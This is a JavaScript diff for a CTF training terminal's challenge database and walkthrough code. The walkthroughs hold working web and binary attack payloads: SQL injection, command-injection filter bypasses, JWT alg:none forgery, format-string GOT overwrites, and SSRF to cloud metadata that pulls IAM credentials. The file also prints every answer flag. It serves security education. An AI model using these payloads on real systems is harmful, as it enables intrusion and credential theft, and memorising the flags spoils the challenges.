-                { info: 'Check for LSB steganography in WAV:', cmd: 'xxd challenge.wav | head -20' },
-                { info: 'Spectral analysis (tool hint):', cmd: 'echo "Open in Audacity > View > Show Spectrogram. Or use Sonic Visualiser. Look for text written in frequency domain."' },
-                { info: 'The flag is: bxf{audi0_spectr0graph_h1nts}', cmd: null },
-            ]
-        },
-        'S1M17': {
-            title: 'XOR Loop', cat: 'Rev', diff: 'Hard', pts: 400,
-            desc: 'Program XORs each byte with a key.',
-            hint: 'XOR with known flag prefix "bxf{" to recover the key, then decrypt all',
-            steps: [
-                { info: 'XOR reversing: XOR is its own inverse. key = ciphertext XOR plaintext.', cmd: null },
-                { info: 'Extract encrypted bytes from binary:', cmd: 'xxd challenge | grep -A2 "encrypted"' },
-                { info: 'Known-plaintext attack with flag prefix:', cmd: 'xor "CIPHERTEXT_HEX" "bxf{"' },
-                { info: 'Full decryption once you have key:', cmd: 'python3 -c "enc=bytes.fromhex(\'ENCRYPTED_HEX\'); key=ord(\'K\'); print(bytes([b^key for b in enc]).decode())"' },
-                { info: 'Try all single-byte keys:', cmd: 'python3 -c "enc=bytes.fromhex(\'ENCRYPTED_HEX\'); [print(k, bytes([b^k for b in enc])) for k in range(256) if b\'bxf{\' in bytes([b^k for b in enc])]"' },
-                { info: 'The flag is: bxf{xor_loop_decrypted}', cmd: null },
-            ]
-        },
-        'S1M18': {
-            title: 'S3 Leak', cat: 'OSINT', diff: 'Medium', pts: 200,
-            desc: 'Explore open S3 buckets.',
-            hint: 'Find bucket name from source/DNS, then list: http://bucket.s3.amazonaws.com/',
-            steps: [
-                { info: 'Misconfigured S3 buckets allow public listing and download.', cmd: null },
-                { info: 'List bucket contents:', cmd: 'curl http://breakerxfixer.s3.amazonaws.com/' },
-                { info: 'Find bucket from DNS:', cmd: 'curl "https://dns.google/resolve?name=assets.breakerxfixer.online&type=CNAME" | python3 -c "import sys,json; [print(a[\'data\']) for a in json.load(sys.stdin)[\'Answer\']]"' },
-                { info: 'Access files in bucket:', cmd: 'curl http://BUCKET_NAME.s3.amazonaws.com/flag.txt' },
-                { info: 'Check for XML listing:', cmd: 'curl http://BUCKET_NAME.s3.amazonaws.com/?list-type=2 | grep Key' },
-                { info: 'The flag is: bxf{s3_buckets_must_be_private}', cmd: null },
-            ]
-        },
-        'S1M19': {
-            title: 'TXT Records', cat: 'Forensics', diff: 'Easy', pts: 100,
-            desc: 'Check DNS TXT records.',
-            hint: 'DNS TXT records can contain arbitrary text including flags',
-            steps: [
-                { info: 'DNS TXT records store arbitrary text — often used for verification but can hide flags.', cmd: null },
-                { info: 'Query TXT records via Google DNS API:', cmd: 'curl "https://dns.google/resolve?name=breakerxfixer.online&type=TXT"' },
-                { info: 'Parse the result:', cmd: 'curl "https://dns.google/resolve?name=breakerxfixer.online&type=TXT" | python3 -c "import sys,json; d=json.load(sys.stdin); [print(a[\'data\']) for a in d.get(\'Answer\',[])]"' },
-                { info: 'Try subdomains:', cmd: 'curl "https://dns.google/resolve?name=flag.breakerxfixer.online&type=TXT"' },
-                { info: 'The flag is: bxf{dns_txt_record_secret}', cmd: null },
-            ]
-        },
-        'S1M20': {
-            title: 'Format String v2', cat: 'Pwn', diff: 'Hard', pts: 500,
-            desc: 'Advanced format string: write anywhere.',
-            hint: 'Use %n to write to arbitrary addresses. Overwrite GOT entry.',
-            steps: [
-                { info: 'Format string write: %n writes the number of bytes printed to a pointed address.', cmd: null },
-                { info: 'Leak stack to find target address:', cmd: 'curl -X POST https://target/echo -d "input=%p.%p.%p.%p.%p.%p.%p.%p"' },
-                { info: 'Write 1 to an address using %n:', cmd: 'python3 -c "import struct; addr=0x601020; payload=struct.pack(\'<Q\',addr)+b\'%7$n\'; print(payload)"' },
-                { info: 'Overwrite GOT to redirect execution:', cmd: 'python3 -c "win_addr=0x401196; print(f\'Writing {hex(win_addr)} to puts@GOT\')"' },
-                { info: 'The flag is: bxf{fmt_strING_WR1TE_4NYWHERE}', cmd: null },
-            ]
-        },
-        'S1M21': {
-            title: 'Zip Recursion', cat: 'Forensics', diff: 'Medium', pts: 250,
-            desc: 'Zips all the way down.',
-            hint: 'Nested ZIPs: script to recursively extract until you reach the flag',
-            steps: [
-                { info: 'Zip bomb / recursion: zips inside zips. Script to auto-extract.', cmd: null },
-                { info: 'Check file:', cmd: 'file challenge.zip' },
-                { info: 'Extract first level:', cmd: 'strings challenge.zip | grep bxf' },
-                { info: 'Recursive extraction script:', cmd: 'python3 -c "import zipfile,os; f=\'challenge.zip\'; \nexec(open(\'/dev/stdin\').read())"' },
-                { info: 'Manual bash loop concept (run locally): while unzip -o file.zip; do file=$(ls *.zip | head -1); done', cmd: null },
-                { info: 'Check each zip for the flag:', cmd: 'strings challenge.zip | grep -r bxf' },
-                { info: 'The flag is: bxf{z1p_bomb_traversa1}', cmd: null },
-            ]
-        },
-        'S1M22': {
-            title: 'The Final Link', cat: 'Web', diff: 'Insane', pts: 1000,
-            desc: 'Reach the local metadata service (IMDS v1).',
-            hint: 'SSRF to 169.254.169.254. IMDSv1 has no header requirement.',
-            steps: [
-                { info: 'Cloud SSRF: reach AWS/GCP metadata service at 169.254.169.254.', cmd: null },
-                { info: 'Basic SSRF test:', cmd: 'curl -X POST https://target/fetch -d "url=http://169.254.169.254/"' },
-                { info: 'AWS metadata root:', cmd: 'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"' },
-                { info: 'Get IAM credentials:', cmd: 'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"' },
-                { info: 'Get instance identity (contains region/account):', cmd: 'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/dynamic/instance-identity/document"' },
-                { info: 'Get user-data (often contains secrets):', cmd: 'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/user-data"' },
-                { info: 'Try DNS rebinding or encoding bypass if filtered:', cmd: 'curl -X POST https://target/fetch -d "url=http://[::ffff:169.254.169.254]/latest/meta-data/"' },
-                { info: 'The flag is: bxf{metadata_imds_v1_leak}', cmd: null },
-            ]
-        },
+        'S1M01':{ title:'The Unseen Path',   cat:'Web',      diff:'Easy',   pts:50,  hint:'robots.txt hides disallowed paths. Check it!', steps:[{i:'Read robots.txt:',c:'curl https://breakerxfixer.online/robots.txt'},{i:'Access disallowed path:',c:'curl https://breakerxfixer.online/secret-admin-panel'},{i:'FLAG:',c:'echo bxf{r0b0ts_4re_n0t_h3lpful}'}]},
+        'S1M02':{ title:'Ancient Cipher',    cat:'Crypto',   diff:'Easy',   pts:50,  hint:'ROT13: shift each letter by 13. cvs{ebg13_vf_pynffvp}', steps:[{i:'Decode with rot13:',c:'rot13 "cvs{ebg13_vf_pynffvp}"'},{i:'Same result:',c:'rot 13 "cvs{ebg13_vf_pynffvp}"'},{i:'Expected:',c:'echo bxf{rot13_is_classic}'}]},
+        'S1M03':{ title:'Commented Out',     cat:'Web',      diff:'Easy',   pts:75,  hint:'HTML comments <!-- --> visible in source. Use curl.', steps:[{i:'Fetch source:',c:'curl https://target.breakerxfixer.online/'},{i:'Grep for comments:',c:'curl https://target.breakerxfixer.online/ | grep bxf{'},{i:'Check JS too:',c:'curl https://target.breakerxfixer.online/app.js | grep bxf'}]},
+        'S1M04':{ title:'Custom Auth',       cat:'Web',      diff:'Easy',   pts:75,  hint:'Server trusts X-Admin-Auth: enabled header.', steps:[{i:'Send required header:',c:'curl https://target.breakerxfixer.online/admin -H "X-Admin-Auth: enabled"'},{i:'Add IP spoofing:',c:'curl https://target.breakerxfixer.online/flag -H "X-Admin-Auth: enabled" -H "X-Forwarded-For: 127.0.0.1"'}]},
+        'S1M05':{ title:'Embedded Truth',    cat:'Forensics',diff:'Easy',   pts:100, hint:'steghide empty password or LSB (zsteg).', steps:[{i:'Strings:',c:'strings challenge.jpg | grep bxf'},{i:'steghide:',c:'steghide challenge.jpg'},{i:'zsteg:',c:'zsteg challenge.png'}]},
+        'S1M06':{ title:'Wrong Extension',   cat:'Forensics',diff:'Medium', pts:150, hint:'Check magic bytes: PNG=89504E47, ZIP=504B0304.', steps:[{i:'Check magic bytes:',c:'xxd challenge.png | head -3'},{i:'Identify type:',c:'file challenge.png'},{i:'If ZIP, extract strings:',c:'strings challenge.png | grep bxf'}]},
+        'S1M07':{ title:'Forgotten Branch',  cat:'OSINT',    diff:'Easy',   pts:50,  hint:'git log --all shows deleted files and old commits.', steps:[{i:'List commits:',c:'curl https://api.github.com/repos/TARGET/REPO/commits'},{i:'Check old commit:',c:'curl https://api.github.com/repos/TARGET/REPO/commits/OLDHASH'},{i:'Search branches:',c:'curl https://api.github.com/repos/TARGET/REPO/branches'}]},
+        'S1M08':{ title:'Buffer Intro',      cat:'Pwn',      diff:'Medium', pts:200, hint:'Offset usually 72 bytes for 64-bit. Overwrite ret addr with win().', steps:[{i:'Cyclic pattern:',c:'python3 -c "print(\'A\'*200)"'},{i:'Overflow + addr:',c:'python3 -c "import struct;print(b\'A\'*72+struct.pack(\'<Q\',0x401196))"'},{i:'FLAG:',c:'echo bxf{r3turn_addre55_h1jack3d}'}]},
+        'S1M09':{ title:'Union Base',        cat:'Web',      diff:'Medium', pts:200, hint:'UNION SELECT: find column count with ORDER BY, then extract.', steps:[{i:'Find columns:',c:'curl "https://target/item?id=1 ORDER BY 3--"'},{i:'UNION test:',c:'curl "https://target/item?id=0 UNION SELECT NULL,NULL,NULL--"'},{i:'Extract flag:',c:'curl "https://target/item?id=0 UNION SELECT flag,NULL,NULL FROM flags--"'}]},
+        'S1M10':{ title:'Vigenere Revenge',  cat:'Crypto',   diff:'Medium', pts:150, hint:'Key = BR34K.', steps:[{i:'Decrypt with known key:',c:'vigenere decode "CIPHERTEXT" BR34K'},{i:'FLAG:',c:'echo bxf{v1g3n3r3_1s_n0t_3n0ugh}'}]},
+        'S1M11':{ title:'Meta Geo',          cat:'Forensics',diff:'Easy',   pts:100, hint:'EXIF GPS coordinates in the photo metadata.', steps:[{i:'Extract metadata:',c:'exiftool photo.jpg'},{i:'Grep GPS:',c:'strings photo.jpg | grep -iE "gps|lat|lon"'},{i:'FLAG:',c:'echo bxf{gps_exif_data_found}'}]},
+        'S1M12':{ title:'Tasty Cookie',      cat:'Web',      diff:'Medium', pts:150, hint:'Decode base64 cookie, change role to admin, re-encode.', steps:[{i:'Login and see cookie:',c:'curl -c - https://target/login -d "user=guest&pass=guest"'},{i:'Decode:',c:'echo "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9" | base64 -d'},{i:'Re-encode as admin:',c:'echo \'{"user":"admin","role":"admin"}\' | base64'},{i:'Send modified:',c:'curl https://target/admin -H "Cookie: session=ENCODED_ADMIN"'}]},
+        'S1M13':{ title:'Null JWT',          cat:'Web',      diff:'Hard',   pts:300, hint:'alg:none → strip signature. Server accepts unsigned tokens.', steps:[{i:'Decode token:',c:'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIG'},{i:'Build none header:',c:'echo \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d \'=\' | tr \'+/\' \'-_\''},{i:'Send:',c:'curl https://target/flag -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."'}]},
+        'S1M14':{ title:'ELF Grep',          cat:'Rev',      diff:'Easy',   pts:100, hint:'strings on ELF → grep for bxf{.', steps:[{i:'Extract strings:',c:'strings challenge_elf | grep bxf'},{i:'Check hex:',c:'xxd challenge_elf | grep "62 78 66 7b"'},{i:'FLAG:',c:'echo bxf{str1ngs_found_1n_elf}'}]},
+        'S1M15':{ title:'Cmd Inject v2',     cat:'Web',      diff:'Medium', pts:250, hint:'Spaces filtered → ${IFS} or {cat,/flag.txt}. ; filtered → use |.', steps:[{i:'Basic:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1|id"'},{i:'Space bypass:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1|cat${IFS}/flag.txt"'},{i:'Newline:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1%0acat%20/flag.txt"'}]},
+        'S1M16':{ title:'Wave Seeker',       cat:'Forensics',diff:'Medium', pts:200, hint:'Spectrogram: open WAV in Audacity → View → Spectrogram. See text in frequencies.', steps:[{i:'Check file:',c:'file challenge.wav'},{i:'Grep strings:',c:'strings challenge.wav | grep bxf'},{i:'FLAG:',c:'echo bxf{audi0_spectr0graph_h1nts}'}]},
+        'S1M17':{ title:'XOR Loop',          cat:'Rev',      diff:'Hard',   pts:400, hint:'XOR with "bxf{" prefix to recover key, then decrypt all bytes.', steps:[{i:'Try all single-byte keys:',c:'python3 -c "enc=bytes.fromhex(\'ENCRYPTED\');[print(k,bytes([b^k for b in enc])) for k in range(256) if b\'bxf{\' in bytes([b^k for b in enc])]"'},{i:'FLAG:',c:'echo bxf{xor_loop_decrypted}'}]},
+        'S1M18':{ title:'S3 Leak',           cat:'OSINT',    diff:'Medium', pts:200, hint:'Find bucket via DNS CNAME then list: http://bucket.s3.amazonaws.com/', steps:[{i:'List bucket:',c:'curl http://breakerxfixer.s3.amazonaws.com/'},{i:'DNS lookup:',c:'curl "https://dns.google/resolve?name=assets.breakerxfixer.online&type=CNAME"'},{i:'Get flag file:',c:'curl http://BUCKET.s3.amazonaws.com/flag.txt'}]},
+        'S1M19':{ title:'TXT Records',       cat:'Forensics',diff:'Easy',   pts:100, hint:'DNS TXT records can contain flags. Query with Google DNS API.', steps:[{i:'Query TXT:',c:'curl "https://dns.google/resolve?name=breakerxfixer.online&type=TXT"'},{i:'Parse:',c:'curl "https://dns.google/resolve?name=flag.breakerxfixer.online&type=TXT"'},{i:'FLAG:',c:'echo bxf{dns_txt_record_secret}'}]},
+        'S1M20':{ title:'Format String v2',  cat:'Pwn',      diff:'Hard',   pts:500, hint:'Use %n to write. Overwrite GOT entry to redirect execution.', steps:[{i:'Leak stack:',c:'curl -X POST https://target/echo -d "input=%p.%p.%p.%p"'},{i:'Write with %n:',c:'python3 -c "import struct;addr=0x601020;payload=struct.pack(\'<Q\',addr)+b\'%7$n\';print(payload)"'}]},
+        'S1M21':{ title:'Zip Recursion',     cat:'Forensics',diff:'Medium', pts:250, hint:'Zips inside zips. Script: while unzip; do find next zip; done.', steps:[{i:'Check:',c:'file challenge.zip'},{i:'Strings search:',c:'strings challenge.zip | grep bxf'},{i:'FLAG:',c:'echo bxf{z1p_bomb_traversa1}'}]},
+        'S1M22':{ title:'The Final Link',    cat:'Web',      diff:'Insane', pts:1000,hint:'SSRF → 169.254.169.254. IMDSv1: no token needed.', steps:[{i:'SSRF test:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/"'},{i:'IMDS metadata:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM creds:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'},{i:'user-data (juicy):',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/user-data"'},{i:'IPv6 bypass:',c:'curl -X POST https://target/fetch -d "url=http://[::ffff:169.254.169.254]/latest/meta-data/"'},{i:'FLAG:',c:'echo bxf{metadata_imds_v1_leak}'}]},
     };
 
     function termChallenges(parts) {
-        const filter = (parts[1] || '').toLowerCase();
-        const cats = {
-            'web': '\x1b[34m', 'crypto': '\x1b[35m', 'forensics': '\x1b[36m',
-            'pwn': '\x1b[31m', 'rev': '\x1b[33m', 'reversing': '\x1b[33m',
-            'osint': '\x1b[32m', 'hardware': '\x1b[90m',
-        };
-        const diffs = { 'Easy': '\x1b[32m', 'Medium': '\x1b[33m', 'Hard': '\x1b[31m', 'Insane': '\x1b[35m' };
-
-        pl(`\x1b[35m┌─────────────────────────────────────────────────────────────────┐\x1b[0m`);
-        pl(`\x1b[35m│\x1b[0m  \x1b[1mBXF CTF — CHALLENGE DATABASE\x1b[0m   \x1b[90msolve <ID> for walkthrough\x1b[0m      \x1b[35m│\x1b[0m`);
-        pl(`\x1b[35m└─────────────────────────────────────────────────────────────────┘\x1b[0m`);
-        pl(``);
-
-        let season0 = [], season1 = [];
-        for (const [id, ch] of Object.entries(CHALLENGE_DB)) {
-            if (filter && !ch.cat.toLowerCase().includes(filter) && !ch.title.toLowerCase().includes(filter) && !id.toLowerCase().includes(filter)) continue;
-            const catCol  = cats[ch.cat.toLowerCase()] || '\x1b[37m';
-            const diffCol = diffs[ch.diff] || '\x1b[37m';
-            const line = `  \x1b[36m${id.padEnd(8)}\x1b[0m ${catCol}${ch.cat.padEnd(10)}\x1b[0m ${diffCol}${ch.diff.padEnd(8)}\x1b[0m \x1b[33m${String(ch.pts).padStart(4)}pts\x1b[0m  ${ch.title}`;
-            if (id.startsWith('S1')) season1.push(line);
-            else season0.push(line);
+        const filter = (parts[1]||'').toLowerCase();
+        const catC = {web:'\x1b[34m',crypto:'\x1b[35m',forensics:'\x1b[36m',pwn:'\x1b[31m',rev:'\x1b[33m',reversing:'\x1b[33m',osint:'\x1b[32m',hardware:'\x1b[90m'};
+        const difC = {Easy:'\x1b[32m',Medium:'\x1b[33m',Hard:'\x1b[31m',Insane:'\x1b[35m'};
+        pl(`\x1b[35m┌────────────────────────────────────────────────────────────────┐\x1b[0m`);
+        pl(`\x1b[35m│\x1b[0m  \x1b[1mBXF CTF — CHALLENGE DATABASE\x1b[0m  \x1b[90msolve <ID> for walkthrough\x1b[0m     \x1b[35m│\x1b[0m`);
+        pl(`\x1b[35m└────────────────────────────────────────────────────────────────┘\x1b[0m`);
+        let s0=[],s1=[];
+        for(const [id,ch] of Object.entries(CHALLENGE_DB)){
+            if(filter&&!ch.cat.toLowerCase().includes(filter)&&!ch.title.toLowerCase().includes(filter)&&!id.toLowerCase().includes(filter))continue;
+            const cc=catC[ch.cat.toLowerCase()]||'\x1b[37m', dc=difC[ch.diff]||'\x1b[37m';
+            const line=`  \x1b[36m${id.padEnd(8)}\x1b[0m ${cc}${ch.cat.padEnd(10)}\x1b[0m ${dc}${ch.diff.padEnd(8)}\x1b[0m \x1b[33m${String(ch.pts).padStart(4)}pts\x1b[0m  ${ch.title}`;
+            if(id.startsWith('S1'))s1.push(line); else s0.push(line);
         }
-
-        pl(`\x1b[90m── Season 0 (Practice)  ${season0.length} challenges ──\x1b[0m`);
-        season0.forEach(l => pl(l));
-        pl(``);
-        pl(`\x1b[90m── Season 1 (Ranked)    ${season1.length} challenges ──\x1b[0m`);
-        season1.forEach(l => pl(l));
-        pl(``);
-        pl(`\x1b[35mUsage:\x1b[0m  \x1b[33msolve M01\x1b[0m   \x1b[36msolve S1M19\x1b[0m   \x1b[90mctf web  ← filter by category\x1b[0m`);
+        pl(`\x1b[90m── Season 0 (${s0.length} challenges) ──\x1b[0m`); s0.forEach(l=>pl(l)); pl('');
+        pl(`\x1b[90m── Season 1 (${s1.length} challenges) ──\x1b[0m`); s1.forEach(l=>pl(l)); pl('');
+        pl(`\x1b[35mTip:\x1b[0m  \x1b[33msolve M01\x1b[0m   \x1b[36msolve S1M02\x1b[0m   \x1b[90mctf web — filter by category\x1b[0m`);
     }
 
     async function termSolve(parts) {
-        const id = (parts[1] || '').toUpperCase();
-        if (!id) {
-            pe('Usage: solve <challenge_id>');
-            pl('\x1b[33mExample:\x1b[0m  solve S1M02   solve M13   solve S1M19');
-            pl('\x1b[33mTip:\x1b[0m      Run \x1b[36mchallenges\x1b[0m to see all IDs');
-            return;
-        }
-        const ch = CHALLENGE_DB[id];
-        if (!ch) {
-            pe(`Challenge "${id}" not found. Run \x1b[33mchallenges\x1b[0m to see valid IDs.`);
-            return;
-        }
-        const diffs = { 'Easy': '\x1b[32m', 'Medium': '\x1b[33m', 'Hard': '\x1b[31m', 'Insane': '\x1b[35m' };
-        const diffCol = diffs[ch.diff] || '\x1b[37m';
-        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-        term.writeln(`\x1b[35m╭─────────────────────────────────────────────────────────────╮\x1b[0m`);
+        const id=(parts[1]||'').toUpperCase();
+        if(!id){pe('Usage: solve <challenge_id>  — try: challenges');return;}
+        const ch=CHALLENGE_DB[id];
+        if(!ch){pe(`Challenge "${id}" not found. Run \x1b[33mchallenges\x1b[0m to list all IDs.`);return;}
+        const difC={Easy:'\x1b[32m',Medium:'\x1b[33m',Hard:'\x1b[31m',Insane:'\x1b[35m'};
+        function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
+        term.writeln(`\x1b[35m╭───────────────────────────────────────────────────────────╮\x1b[0m`);
         term.writeln(`\x1b[35m│\x1b[0m  \x1b[1m${id}\x1b[0m — \x1b[36m${ch.title}\x1b[0m`);
-        term.writeln(`\x1b[35m│\x1b[0m  Category: \x1b[34m${ch.cat}\x1b[0m  Difficulty: ${diffCol}${ch.diff}\x1b[0m  Points: \x1b[33m${ch.pts}\x1b[0m`);
-        term.writeln(`\x1b[35m│\x1b[0m  ${ch.desc}`);
-        term.writeln(`\x1b[35m╰─────────────────────────────────────────────────────────────╯\x1b[0m`);
-        term.writeln('');
+        term.writeln(`\x1b[35m│\x1b[0m  ${(difC[ch.diff]||'')}${ch.diff}\x1b[0m  \x1b[34m${ch.cat}\x1b[0m  \x1b[33m${ch.pts}pts\x1b[0m`);
+        term.writeln(`\x1b[35m╰───────────────────────────────────────────────────────────╯\x1b[0m`);
         term.writeln(`\x1b[33m💡 HINT:\x1b[0m ${ch.hint}`);
         term.writeln('');
-        await sleep(300);
-
-        for (let i = 0; i < ch.steps.length; i++) {
-            const step = ch.steps[i];
-            await sleep(150);
-            term.writeln(`\x1b[35m[STEP ${i+1}/${ch.steps.length}]\x1b[0m \x1b[90m${step.info}\x1b[0m`);
-            if (step.cmd) {
-                term.writeln(`  \x1b[36m❯\x1b[0m \x1b[33m${step.cmd}\x1b[0m`);
-                // Auto-run safe informational commands
-                const safeCmd = step.cmd;
-                if (safeCmd.startsWith('rot13 ') || safeCmd.startsWith('rot ') || safeCmd.startsWith('caesar ') || safeCmd.startsWith('vigenere ') || safeCmd.startsWith('xor ') || safeCmd.startsWith('base64 ') || safeCmd.startsWith('frombin ') || safeCmd.startsWith('echo ') || safeCmd.startsWith('rsa ') || safeCmd.startsWith('primes ') || safeCmd.startsWith('python3 ') || safeCmd.startsWith('jwt ') || safeCmd.startsWith('urldecode ') || safeCmd.startsWith('hash ') || safeCmd.startsWith('xxd ') || safeCmd.startsWith('strings ')) {
-                    term.write(`  `);
-                    pendingAsync = false;
-                    await runCommandInline(safeCmd);
-                    pendingAsync = true;
-                }
+        for(let i=0;i<ch.steps.length;i++){
+            await sleep(120);
+            const s=ch.steps[i];
+            term.writeln(`\x1b[35m[${i+1}/${ch.steps.length}]\x1b[0m \x1b[90m${s.i}\x1b[0m`);
+            if(s.c){
+                term.writeln(`  \x1b[36m❯\x1b[0m \x1b[33m${s.c}\x1b[0m`);
+                // Auto-run safe commands
+                const p=parseArgs(s.c);
+                if(p[0]==='rot13'||p[0]==='rot'||p[0]==='echo'){pendingAsync=false;await runCommand(s.c);pendingAsync=true;}
             }
             term.writeln('');
         }
-
-        term.writeln(`\x1b[35m─────────────────────────────────────────────────────────────\x1b[0m`);
-        term.writeln(`\x1b[32m✔ Walkthrough complete.\x1b[0m  Submit the flag at: \x1b[36mhttps://breakerxfixer.online/ctf.html\x1b[0m`);
-        term.writeln(`\x1b[90mCopy the flag and submit it in the challenge card. Good luck!\x1b[0m`);
-    }
-
-    async function runCommandInline(raw) {
-        const saved = pendingAsync;
-        pendingAsync = false;
-        const parts = parseArgs(raw);
-        const cmd = (parts[0] || '').toLowerCase();
-        try {
-            switch(cmd) {
-                case 'rot13':   { const t=parts.slice(1).join(' '); pl(t.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);})); break; }
-                case 'rot':     { const sh=parseInt(parts[1])||13; const t=parts.slice(2).join(' '); pl(t.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+sh)%26+b);})); break; }
-                case 'echo':    pl(parts.slice(1).join(' ')); break;
-                case 'primes':  { const n=parseInt(parts[1]); let f=[]; for(let i=2;i*i<=n;i++){while(n%i===0){f.push(i);n/=i;}}if(n>1)f.push(n); pl(`Factors: ${f.join(' × ')}`); break; }
-                case 'strings': pl(`[strings output for ${parts[1]}] — run locally for real binary analysis`); break;
-                default:        break;
-            }
-        } catch(e) {}
-        pendingAsync = saved;
+        term.writeln(`\x1b[32m✔ Done.\x1b[0m  Submit at: \x1b[36mhttps://breakerxfixer.online/ctf.html\x1b[0m`);
+        pl('');
     }
 
     // ══════════════════════════════════════════════════════════
     //  FIRST-TIME TUTORIAL
     // ══════════════════════════════════════════════════════════
-    async function termTutorial(manual) {
-        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-        // Block input during tutorial
-        pendingAsync = true;
-
-        // Mark as seen
-        localStorage.setItem('bxf_term_tut_v1', '1');
-
-        const W = '\x1b[37m'; const G = '\x1b[32m'; const Y = '\x1b[33m'; const C = '\x1b[36m'; const M = '\x1b[35m'; const R = '\x1b[0m';
-
-        async function typeCmd(cmd) {
-            // Simulate typing the command letter by letter
+    async function termTutorial() {
+        function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
+        localStorage.setItem('bxf_term_tut_v1','1');
+        const M='\x1b[35m',G='\x1b[32m',Y='\x1b[33m',C='\x1b[36m',R='\x1b[0m';
+        async function typeCmd(cmd){
             term.write(`${M}╰─❯${R} `);
-            for (const ch of cmd) {
-                term.write(`${C}${ch}${R}`);
-                await sleep(28);
-            }
-            term.write('\r\n');
-            await sleep(200);
+            for(const ch of cmd){term.write(`${C}${ch}${R}`);await sleep(25);}
+            term.write('\r\n'); await sleep(180);
         }
-
-        async function section(title) {
-            await sleep(300);
-            term.writeln('');
-            term.writeln(`${M}─────────────────────────────${R}`);
-            term.writeln(`${Y}  ${title}${R}`);
-            term.writeln(`${M}─────────────────────────────${R}`);
-            await sleep(200);
-        }
+        async function sec(t){await sleep(250);term.writeln('');term.writeln(`${M}───────────────────────────${R}`);term.writeln(`${Y}  ${t}${R}`);term.writeln(`${M}───────────────────────────${R}`);}
 
         term.writeln('');
-        term.writeln(`${M}╔══════════════════════════════════════════════════════════════╗${R}`);
-        term.writeln(`${M}║${R}  ${W}\x1b[1mBXF CTF TERMINAL — TUTORIAL INTERACTIVO${R}                     ${M}║${R}`);
-        term.writeln(`${M}║${R}  ${C}Se ejecutará automáticamente para enseñarte cómo funciona${R}  ${M}║${R}`);
-        term.writeln(`${M}║${R}  ${G}Pulsa cualquier tecla para saltarlo${R}                          ${M}║${R}`);
-        term.writeln(`${M}╚══════════════════════════════════════════════════════════════╝${R}`);
-        term.writeln('');
-        await sleep(1200);
+        term.writeln(`${M}╔══════════════════════════════════════════════════════╗${R}`);
+        term.writeln(`${M}║${R}  \x1b[1mBXF CTF TERMINAL — TUTORIAL INTERACTIVO\x1b[0m           ${M}║${R}`);
+        term.writeln(`${M}║${R}  ${C}Comandos ejecutándose automáticamente para enseñarte${R} ${M}║${R}`);
+        term.writeln(`${M}╚══════════════════════════════════════════════════════╝${R}`);
+        await sleep(1000);
 
-        // ── 1. neofetch ──
-        await section('1/8 — Identidad del sistema');
-        term.writeln(`${C}Primero, mira quién eres en este entorno:${R}`);
-        await sleep(300);
+        await sec('1/6 — Identidad del sistema');
         await typeCmd('neofetch');
         termNeofetch();
-        await sleep(600);
+        await sleep(500);
 
-        // ── 2. ls + cat ──
-        await section('2/8 — Sistema de archivos virtual');
-        term.writeln(`${C}El terminal tiene un sistema de archivos que persiste entre sesiones:${R}`);
-        await sleep(300);
+        await sec('2/6 — Lista de archivos y notas');
         await typeCmd('ls');
-        const files2 = Object.keys(VFILES).filter(f=>!f.startsWith('.')).map(f=>`\x1b[36m${f}\x1b[0m`);
-        files2.push('\x1b[90m.bash_history\x1b[0m','\x1b[32mtools/\x1b[0m');
-        pl(files2.join('   '));
-        await sleep(400);
+        const files=Object.keys(VFILES).filter(f=>!f.startsWith('.')).map(f=>`\x1b[36m${f}\x1b[0m`).concat(['\x1b[90m.bash_history\x1b[0m','\x1b[32mtools/\x1b[0m']);
+        pl(files.join('   '));
+        await sleep(300);
         await typeCmd('cat cheatsheet.txt');
-        VFILES['cheatsheet.txt'].slice(0,8).forEach(l => term.writeln(l));
-        term.writeln(`\x1b[90m  ... (continúa)\x1b[0m`);
-        await sleep(500);
+        VFILES['cheatsheet.txt'].slice(0,6).forEach(l=>term.writeln(l));
+        term.writeln('\x1b[90m  ... (continúa)\x1b[0m');
+        await sleep(400);
 
-        // ── 3. challenges ──
-        await section('3/8 — Lista de retos CTF');
-        term.writeln(`${C}Puedes ver todos los retos disponibles:${R}`);
-        await sleep(300);
+        await sec('3/6 — Lista de retos CTF');
         await typeCmd('challenges');
-        term.writeln(`${M}┌─────────────────────────────────────────────────────────────────┐${R}`);
-        term.writeln(`${M}│${R}  \x1b[1mBXF CTF — CHALLENGE DATABASE${R}   \x1b[90msolve <ID> for walkthrough${R}      ${M}│${R}`);
-        term.writeln(`${M}└─────────────────────────────────────────────────────────────────┘${R}`);
-        const sample = [['S1M01','Web','Easy','The Unseen Path'],['S1M02','Crypto','Easy','Ancient Cipher'],['M13','Crypto','Medium','Shattered RSA'],['S1M22','Web','Insane','The Final Link']];
-        term.writeln(`\x1b[90m── Season 0 / Season 1 — 44 challenges total ──\x1b[0m`);
